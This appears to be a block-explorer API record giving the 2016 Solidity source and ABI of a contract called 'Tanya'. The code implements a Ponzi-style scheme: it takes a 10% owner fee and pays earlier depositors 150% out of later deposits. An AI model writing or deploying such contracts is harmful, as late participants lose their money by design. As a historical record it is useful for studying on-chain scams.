{"status":"1","message":"OK","result":[{"SourceCode":"contract Tanya {\r\n\r\n    struct Participant {\r\n        address etherAddress;\r\n        uint amount;\r\n    }\r\n\r\n    Participant[] public participants;\r\n\r\n\tuint public payoutIdx = 0;\r\n\tuint public collectedFees = 0;\r\n\tuint balance = 0;\r\n\r\n  // only owner modifier\r\n\taddress public owner;\r\n    modifier onlyowner { if (msg.sender == owner) _ }\r\n\r\n  // contract Constructor\r\n    function Tanya() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n // fallback function\r\n    function(){\r\n        enter();\r\n    }\r\n\r\n\tfunction enter(){\r\n      // collect fee\r\n        uint fee = msg.value / 10;\r\n        collectedFees += fee;\r\n\r\n      // add a new participant\r\n\t\tuint idx = participants.length;\r\n        participants.length++;\r\n        participants[idx].etherAddress = msg.sender;\r\n        participants[idx].amount = msg.value;\r\n\r\n      // update available balance\r\n      \tbalance += msg.value - fee;\r\n      \t\r\n\t  // if there are enough ether on the balance we can pay out to an earlier participant\r\n\t  \tuint txAmount = participants[payoutIdx].amount / 100 * 150;\r\n        if(balance >= txAmount){\r\n        \tif(!participants[payoutIdx].etherAddress.send(txAmount)) throw;\r\n\r\n            balance -= txAmount;\r\n            payoutIdx++;\r\n        }\r\n    }\r\n\r\n    function collectFees() onlyowner {\r\n        if(collectedFees == 0)return;\r\n\r\n        if(!owner.send(collectedFees))throw;\r\n        collectedFees = 0;\r\n    }\r\n\r\n    function setOwner(address _owner) onlyowner {\r\n        owner = _owner;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"participants\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"collectedFees\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payoutIdx\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"collectFees\",\"outputs\":[],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"Tanya","CompilerVersion":"v0.3.5-2016-07-21-6610add","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":""}]}